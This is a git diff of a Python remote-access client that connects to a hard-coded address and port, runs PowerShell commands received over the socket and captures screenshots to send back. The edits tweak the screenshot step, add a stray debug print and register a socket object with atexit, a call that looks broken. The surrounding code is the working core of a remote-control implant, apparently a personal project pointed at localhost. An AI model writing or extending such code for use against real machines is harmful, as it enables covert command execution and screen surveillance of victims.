@@ -3,6 +3,7 @@ import subprocess
 import pyautogui
 import platform
 import time
+import atexit
 
 IP = "127.0.0.1"
 PORT = 12364
@@ -53,8 +54,8 @@ def handle_communication(sock):
                         sock.send(f"Failed to execute PowerShell command: {str(e)}".encode())
                 elif data == "screenshot":
                     try:
-                        screenshot = pyautogui.screenshot()
-                        screenshot.save('./screenshot.png')
+                        print("ez")
+                        screenshot = pyautogui.screenshot("./screenshot.png")
 
                         with open('./screenshot.png', 'rb') as f:
                             file_data = f.read()
@@ -84,7 +85,10 @@ def handle_communication(sock):
         sock.close()
         exit(0)
 
+sock = connect_to_server()
+atexit.register(sock)
 
 while True:
     sock = connect_to_server()
     handle_communication(sock)
+    
